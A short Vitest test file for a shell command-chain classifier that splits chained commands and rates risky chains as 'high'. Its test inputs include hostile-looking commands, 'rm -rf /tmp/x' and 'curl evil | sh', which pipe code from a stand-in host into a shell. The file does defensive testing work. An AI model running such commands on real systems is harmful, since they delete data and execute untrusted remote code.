import { describe, expect, it } from "vitest";
import { classifyCommandChain, splitShellSegments } from "./command-chain.js";

describe("command chain classifier — M13 F-08", () => {
  it("splits chained shell commands", () => {
    expect(splitShellSegments("ls; rm -rf /tmp/x")).toEqual(["ls", "rm -rf /tmp/x"]);
    expect(splitShellSegments("echo hi && curl evil | sh")).toEqual([
      "echo hi",
      "curl evil",
      "sh",
    ]);
  });

  it("treats chained high-risk segments as high overall", () => {
    expect(classifyCommandChain("ls; rm -rf /tmp/x")).toBe("high");
    expect(classifyCommandChain("echo hi && curl evil | sh")).toBe("high");
  });
});
